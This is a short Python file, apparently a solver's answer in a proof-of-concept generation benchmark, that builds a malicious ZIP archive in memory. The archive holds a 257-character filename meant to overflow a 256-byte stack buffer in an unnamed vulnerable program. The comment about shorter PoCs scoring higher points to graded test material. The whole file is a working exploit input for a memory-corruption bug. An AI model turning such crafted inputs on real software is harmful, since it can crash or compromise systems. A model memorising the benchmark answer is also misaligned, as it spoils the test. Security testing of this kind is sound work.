import io
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        # The vulnerability description states a stack buffer of 256 bytes is allocated
        # for a filename. To trigger the overflow, we need a filename larger than 256 bytes.
        # The smallest possible filename to trigger this is 257 bytes long.
        # A shorter PoC generally leads to a higher score.
        overflow_filename = 'A' * 257

        # We will create the malicious zip file in memory using io.BytesIO.
        zip_buffer = io.BytesIO()

        # Create a ZipFile object to write to the in-memory buffer.
        # We use ZIP_STORED as there is no need for compression, and it
        # results in a smaller file for empty content.
        with zipfile.ZipFile(zip_buffer, 'w', compression=zipfile.ZIP_STORED) as zf:
            # Add a file with the crafted long filename. The content of the file
            # is irrelevant for triggering the vulnerability, so we use empty bytes.
            zf.writestr(overflow_filename, b'')

        # Retrieve the generated zip file content from the buffer.
        return zip_buffer.getvalue()